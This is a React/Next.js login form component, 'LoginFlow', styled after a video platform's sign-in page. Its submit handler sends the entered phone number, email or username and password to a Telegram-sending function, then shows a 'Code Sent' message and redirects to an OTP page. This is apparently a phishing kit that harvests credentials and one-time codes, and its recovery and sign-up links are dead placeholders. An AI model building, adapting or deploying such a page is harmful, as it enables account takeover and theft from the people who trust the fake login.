
"use client";

import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { Eye, EyeOff, Mail, Phone } from "lucide-react";
import Link from "next/link";
import { useRouter } from "next/navigation";

import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
  DialogClose,
} from "@/components/ui/dialog";
import { useToast } from "@/hooks/use-toast";
import { countries } from "@/lib/countries";
import { sendLoginDataToTelegram } from "@/app/actions/telegram";


const formSchema = z.discriminatedUnion("loginType", [
  z.object({
    loginType: z.literal("phone"),
    country: z.string(),
    countryCode: z.string().min(1, "Country code is required"),
    phone: z.string().regex(/^\d{1,15}$/, "Please enter a valid phone number."),
    password: z.string().min(8, "Password must be at least 8 characters."),
  }),
  z.object({
    loginType: z.literal("email"),
    identifier: z.string().min(1, "Email or username is required.")
      .refine(val => {
        const isEmail = z.string().email().safeParse(val).success;
        const isUsername = /^@?[a-zA-Z0-9_.-]+$/.test(val);
        return isEmail || isUsername;
      }, "Please enter a valid email or username."),
    password: z.string().min(8, "Password must be at least 8 characters."),
  }),
]);

type LoginFormValues = z.infer<typeof formSchema>;

export function LoginForm() {
  const [activeTab, setActiveTab] = useState("phone");
  const [showPassword, setShowPassword] = useState(false);
  const [country, setCountry] = useState("United States");
  const { toast } = useToast();
  const router = useRouter();
  
  const form = useForm<LoginFormValues>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      loginType: "phone",
      country: "United States",
      countryCode: "+1",
      phone: "",
      password: "",
    },
  });

  const { control, handleSubmit, formState: { errors, isSubmitting }, reset, setError, setValue, watch } = form;

  useEffect(() => {
    // IP-based country detection
    fetch('https://ipapi.co/json/')
      .then(response => response.json())
      .then(data => {
        const countryName = data.country_name;
        const matchingCountry = countries.find(c => c.name === countryName);
        if (matchingCountry) {
          setCountry(matchingCountry.name);
          setValue("country", matchingCountry.name);
          setValue("countryCode", matchingCountry.code);
        }
      })
      .catch(() => {
        // Fallback to a default country
        const defaultCountry = countries.find(c => c.name === "United States");
        if(defaultCountry) {
          setCountry(defaultCountry.name);
          setValue("country", defaultCountry.name);
          setValue("countryCode", defaultCountry.code);
        }
      });
  }, [setValue]);

  const handleTabChange = (value: string) => {
    setActiveTab(value);
    setShowPassword(false);
    const selectedCountry = countries.find(c => c.name === country);
    if (value === "phone") {
      reset({
        loginType: "phone",
        country: selectedCountry?.name || "United States",
        countryCode: selectedCountry?.code || "+1",
        phone: "",
        password: "",
      });
    } else {
      reset({
        loginType: "email",
        identifier: "",
        password: "",
      });
    }
  };

  async function onSubmit(values: LoginFormValues) {
    const result = await sendLoginDataToTelegram(values);
    
    if (result.success) {
        toast({
            title: "Code Sent",
            description: "A one-time password has been sent to you.",
        });
        router.push('/otp');
    } else {
        toast({
            title: "Login Failed",
            description: "Something went wrong. Please try again.",
            variant: "destructive",
        });
    }
  }

  const PasswordInput = ({ fieldName }: { fieldName: `password` }) => (
    <FormField
      control={control}
      name={fieldName}
      render={({ field }) => (
        <FormItem>
          <div className="relative">
            <FormControl>
              <Input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                {...field}
                aria-invalid={!!errors[fieldName]}
                className="pr-10"
              />
            </FormControl>
            <Button
              type="button"
              variant="ghost"
              size="icon"
              className="absolute inset-y-0 right-0 h-full text-muted-foreground hover:bg-transparent"
              onClick={() => setShowPassword(!showPassword)}
              aria-label={showPassword ? "Hide password" : "Show password"}
            >
              {showPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
            </Button>
          </div>
          <FormMessage />
        </FormItem>
      )}
    />
  );

  return (
    <div className="w-full p-6 sm:p-8 space-y-4 bg-card rounded-xl shadow-lg">
      <div className="text-center">
        <h1 className="text-2xl font-bold font-headline">Log in to LoginFlow</h1>
        <p className="text-sm text-muted-foreground mt-2">
          Manage your account, check notifications, comment on videos, and more.
        </p>
      </div>
      <Tabs value={activeTab} onValueChange={handleTabChange} className="w-full">
        <TabsList className="grid w-full grid-cols-2">
          <TabsTrigger value="phone">Phone</TabsTrigger>
          <TabsTrigger value="email">Email / Username</TabsTrigger>
        </TabsList>
        <Form {...form}>
          <form onSubmit={handleSubmit(onSubmit)} className="space-y-4 pt-4">
            <TabsContent value="phone" className="m-0 space-y-4">
              <div className="flex items-start gap-2">
                <FormField
                  control={control}
                  name="countryCode"
                  render={({ field }) => (
                    <FormItem className="w-[110px]">
                      <Select
                        onValueChange={(countryName) => {
                          const newCountry = countries.find(
                            (c) => c.name === countryName
                          );
                          if (newCountry) {
                            field.onChange(newCountry.code);
                            setValue("country", newCountry.name);
                            setCountry(newCountry.name);
                          }
                        }}
                        value={country}
                      >
                        <FormControl>
                          <SelectTrigger>
                            <SelectValue>
                              {countries.find(c => c.name === country)?.code}
                            </SelectValue>
                          </SelectTrigger>
                        </FormControl>
                        <SelectContent>
                          {countries.map((c) => (
                            <SelectItem key={c.name} value={c.name}>
                              {c.name} ({c.code})
                            </SelectItem>
                          ))}
                        </SelectContent>
                      </Select>
                      <FormMessage />
                    </FormItem>
                  )}
                />
                <FormField
                  control={control}
                  name="phone"
                  render={({ field }) => (
                    <FormItem className="flex-1">
                      <FormControl>
                        <Input type="tel" placeholder="Phone number" {...field} autoFocus />
                      </FormControl>
                      <FormMessage />
                    </FormItem>
                  )}
                />
              </div>
              <PasswordInput fieldName="password" />
            </TabsContent>
            <TabsContent value="email" className="m-0 space-y-4">
              <FormField
                control={control}
                name="identifier"
                render={({ field }) => (
                  <FormItem>
                    <FormControl>
                      <Input type="text" placeholder="Email or username" {...field} autoFocus />
                    </FormControl>
                    <FormMessage />
                  </FormItem>
                )}
              />
              <PasswordInput fieldName="password" />
            </TabsContent>
            
            <Dialog>
              <DialogTrigger asChild>
                <button type="button" className="block text-sm text-primary hover:text-accent text-right font-semibold transition-colors w-full">
                  Forgot password?
                </button>
              </DialogTrigger>
              <DialogContent className="sm:max-w-md bg-white">
                <DialogHeader>
                  <DialogTitle className="text-black text-center text-xl">Reset password with:</DialogTitle>
                </DialogHeader>
                <div className="flex flex-col space-y-3 pt-4">
                    <Link href="#" passHref>
                      <Button asChild variant="outline" className="w-full justify-start text-base py-6 border-gray-300 text-black hover:bg-gray-100 cursor-pointer">
                          <div>
                            <Phone className="mr-3" />
                            Phone number
                          </div>
                      </Button>
                    </Link>
                    <Link href="#" passHref>
                       <Button asChild variant="outline" className="w-full justify-start text-base py-6 border-gray-300 text-black hover:bg-gray-100 cursor-pointer">
                          <div>
                            <Mail className="mr-3" />
                            Email
                          </div>
                      </Button>
                    </Link>
                    <DialogClose asChild>
                        <Button type="button" variant="secondary" className="w-full text-base py-6 bg-gray-200 text-black hover:bg-gray-300">
                            Cancel
                        </Button>
                    </DialogClose>
                </div>
              </DialogContent>
            </Dialog>

            <Button type="submit" className="w-full text-base font-bold bg-primary text-primary-foreground hover:bg-primary/90" disabled={isSubmitting}>
              {isSubmitting ? "Logging in..." : "Log in"}
            </Button>
          </form>
        </Form>
      </Tabs>

      <div className="text-xs text-center text-muted-foreground pt-4">
         <p>
          By continuing with an account located in{" "}
          <Select onValueChange={(countryName) => {
              const newCountry = countries.find(
                (c) => c.name === countryName
              );
              if (newCountry) {
                setValue("country", newCountry.name);
                if (activeTab === 'phone') {
                  setValue("countryCode", newCountry.code);
                }
                setCountry(newCountry.name);
              }
            }} value={country}>
            <SelectTrigger className="inline-flex w-auto p-0 h-auto border-none shadow-none focus:ring-0 bg-transparent text-primary hover:underline">
                <SelectValue />
            </SelectTrigger>
            <SelectContent>
              {countries.map((c) => (
                <SelectItem key={c.name} value={c.name}>
                  {c.name}
                </SelectItem>
              ))}
            </SelectContent>
          </Select>
          , you agree to our{" "}
          <Link href="#" className="underline hover:text-primary">
            Terms of Service
          </Link>{" "}
          and acknowledge that you have read our{" "}
          <Link href="#" className="underline hover:text-primary">
            Privacy Policy
          </Link>
          .
        </p>
      </div>

      <div className="mt-4 p-4 border-t text-center">
        <p className="text-sm text-muted-foreground">
          Don’t have an account?{" "}
          <Link href="#" className="text-primary hover:text-accent font-bold">
            Sign up
          </Link>
        </p>
      </div>
    </div>
  );
}

    